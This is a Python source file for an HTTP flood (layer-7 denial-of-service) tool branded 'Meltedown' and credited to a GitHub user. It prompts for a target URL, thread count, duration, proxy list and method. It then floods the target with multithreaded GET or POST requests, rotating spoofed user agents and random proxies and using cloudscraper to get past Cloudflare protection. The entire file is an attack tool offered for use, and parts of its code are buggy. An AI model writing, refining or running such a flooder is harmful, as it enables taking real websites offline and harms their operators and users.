import cloudscraper, requests, httpx, threading, fake_useragent, random, sys
import os
from sys import *
from fake_useragent import UserAgent
from multiprocessing import Pool
global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
class color():
    def white():
        white = '\033[0m'
        return white
    def gold():
        gold = '\033[0;33m'
        return gold
    def yellow():
        yellow = '\033[1;33m'
        return yellow
    def red():
        red = '\033[1;91m'
        return red
    def green():
        green = '\033[1;32m'
        return green
    def purple():
        purple = '\033[1;35m'
        return purple
def logo():
    logo = f"""

    {color.purple()}███{color.white()}╗   {color.purple()}███{color.white()}╗{color.purple()}███████{color.white()}╗{color.purple()}██{color.white()}╗  {color.purple()}████████{color.white()}╗{color.purple()}███████{color.white()}╗{color.purple()}██████{color.white()}╗
    {color.purple()}████{color.white()}╗ {color.purple()}████{color.white()}║{color.purple()}██{color.white()}╔════╝{color.purple()}██{color.white()}║  ╚══{color.purple()}██{color.white()}╔══╝{color.purple()}██{color.white()}╔════╝{color.purple()}██{color.white()}╔══{color.purple()}██{color.white()}╗
    {color.purple()}██{color.white()}╔{color.purple()}████{color.white()}╔{color.purple()}██{color.white()}║{color.purple()}█████{color.white()}╗  {color.purple()}██{color.white()}║     {color.purple()}██{color.white()}║   {color.purple()}█████{color.white()}╗  {color.purple()}██{color.white()}║  {color.purple()}██{color.white()}║
    {color.purple()}██{color.white()}║╚{color.purple()}██{color.white()}╔╝{color.purple()}██{color.white()}║{color.purple()}██{color.white()}╔══╝  {color.purple()}██{color.white()}║     {color.purple()}██{color.white()}║   {color.purple()}██{color.white()}╔══╝  {color.purple()}██{color.white()}║  {color.purple()}██{color.white()}║
    {color.purple()}██{color.white()}║ ╚═╝ {color.purple()}██{color.white()}║{color.purple()}███████{color.white()}╗{color.purple()}███████{color.white()}╗{color.purple()}██{color.white()}║   {color.purple()}███████{color.white()}╗{color.purple()}██████{color.white()}╔╝
    {color.white()}╚═╝     ╚═╝╚══════╝╚══════╝╚═╝   ╚══════╝╚═════╝
                                            By MrSanZz
              https://github.com/MrSanZz
    """
    print(logo)
def clear():
    if os.name == 'nt':
        os.system('cls')
    if os.name == 'posix':
        os.system('clear')
def countdown(t):
    t = t+'0000'
    t = int(t)
    while True:
        t -= 1
        if t > 0:
            stdout.flush()
            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Time Left : {}".format(t), end='\r')
        else:
            stdout.flush()
            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Attack Completed! ")
            return
def layer7_target():
    url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
    select = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Use Proxy? Y/N: "+'\033[1;35m'+': '+'\033[0m')
    method = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"METHOD POST/GET "+'\033[1;35m'+': '+'\033[0m')
    if select.lower() == 'y':
        pr_path = input("Proxy Path .txt : ")
        return url, threadsi, t, select, pr_path, method
    else:
        pr_path = None
        return url, threadsi, t, select, pr_path, method
class meltodown:
    def __init__(self, url, **kwargs):
        self.url = url
        self.user_agent = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
        self.timeout = kwargs.get('timeout', {})
        self.verify = kwargs.get('verify', {})
        self.proxies = kwargs.get('proxies', {})
        self.client = None
        self.scraper = None
    def __enter__(self):
        try:
            self.client = httpx.Client(timeout=self.timeout, verify=self.verify, proxies=self.proxies, headers={'User-Agent': self.user_agent})
        except Exception as e:
            self.client = None
        
        try:
            self.scraper = cloudscraper.create_scraper()
        except Exception as e:
            self.scraper = None

        if self.client is None and self.scraper is None:
            raise ValueError("Neither HTTPX Client nor Cloudscraper is initialized.")

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        if self.client:
            self.client.close()

    def _send_request(self, method, data=None, **kwargs):
        headers = {'User-Agent': self.user_agent}
        headers.update(kwargs.get('headers', {}))
        
        try:
            if self.client:
                if method == 'GET':
                    response = self.client.get(self.url, headers=headers)
                elif method == 'POST':
                    headers['Content-Type'] = 'application/json'
                    response = self.client.post(self.url, headers=headers, data=data)
                else:
                    raise ValueError("Invalid HTTP method specified")
            elif self.scraper:
                if method == 'GET':
                    response = self.scraper.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                    response = requests.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                elif method == 'POST':
                    response = self.scraper.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                    response = requests.get(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                else:
                    raise ValueError("Invalid HTTP method specified")
            else:
                raise ValueError("Neither HTTPX Client or Cloudscraper is initialized.")
            
            response.raise_for_status()
            return response.text
        except Exception as e:
            raise Exception(f"Request error occurred: {str(e)}")

    def get(self, **kwargs):
        return self._send_request('GET', **kwargs)

    def post(self, data, **kwargs):
        return self._send_request('POST', data, **kwargs)
def __main__():
    def __I__(url, threads, select, pr_path, method):
        def send(threads):
            for _ in range(int(threads)):
                thread = threading.Thread(target=__A__, args=(url, select, pr_path, method))
                thread.start()
        with Pool(150) as multibot:
            multibot.mp(send, threads)
    def __A__(url, select, pr_path, method):
        def get():
            if select.lower() == 'y':
                ip = open(pr_path, 'r')
                proxies = ip.readlines()
                ip.close()
                header = {
                    "User-Agent": str(UserAgent().chrome)
                }
                proxy = {
                    "http": 'http://'+str(random.choice(proxies)),
                    "https": 'https://'+str(random.choice(proxies))
                }
                with meltodown(url, proxies=proxy, headers=header, timeout=30) as scrap:
                    try:
                        scrap.get()
                    except Exception:
                        raise Exception('Proxy Is Not Valid.')
                    except:
                        pass
            elif select.lower() == 'n':
                header = {
                    "User-Agent": str(UserAgent().chrome)
                }
                with meltodown(url, headers=header, timeout=30) as scrap:
                    try:
                        scrap.get()
                    except Exception as e:
                        print(e)
                    except:
                        pass
            else:
                raise ValueError('Please enter an option!')
        def post():
            data = {
                "X": "XxxXxxXxXxXxxxXxXXXXxxxxxXxxXXxxXxxxXxxxXXXxXX",
                "Y": "YyYyYyyYYyyyYyyYYYyyyyyyyYYYyyyyyyyyyYYYyyYYYy",
                "Z": "zzZzzZZzzZZzzzzzzZZZZZzzZZzZZZZzzZZZZzZzzZzzZz",
                "X1=": "XXxxX===1xXxX!'!xX==X1!11X==x!x''x1XXX!1'!'x1'111=="
            }
            if select.lower() == 'y':
                ip = open(pr_path, 'r')
                proxies = ip.readlines()
                ip.close()
                header = {
                    "User-Agent": str(UserAgent().chrome)
                }
                proxy = {
                    "http": 'http://'+str(random.choice(proxies)),
                    "https": 'https://'+str(random.choice(proxies))
                }
                with meltodown(url, proxies=proxy, headers=header, timeout=30, data=data) as scrap:
                    try:
                        scrap.post(data=data)
                    except Exception:
                        raise Exception('Proxy Is Not Valid.')
                    except:
                        pass
            elif select.lower() == 'n':
                header = {
                    "User-Agent": str(UserAgent().chrome)
                }
                with meltodown(url, headers=header, timeout=30, data=data) as scrap:
                    try:
                        scrap.post(data=data)
                    except Exception as e:
                        print(e)
                    except:
                        pass
            else:
                raise ValueError('Please enter an option!')
        if method.lower() == 'get':
            get()
        elif method.lower() == 'post':
            post()
        else:
            raise ValueError('No method applied')
    if __name__ == '__main__':
        url, threads, t, select, pr_path, method = layer7_target()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        __I__(url, threads, select, pr_path, method)
        timer.join()
if __name__ == '__main__':
    clear()
    logo()
    __main__()
